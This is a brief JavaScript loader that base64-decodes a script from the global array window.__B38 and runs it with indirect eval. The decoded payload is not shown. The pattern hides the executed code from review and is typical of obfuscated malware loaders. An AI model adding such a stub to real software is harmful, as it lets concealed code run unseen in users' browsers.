(function(){
  var p=window.__B38||[];
  if(!p.length){console.error('B38 missing');return;}
  var bin=atob(p.join(''));
  var bytes=new Uint8Array(bin.length);
  for(var i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i);
  (0,eval)(new TextDecoder('utf-8').decode(bytes));
})();
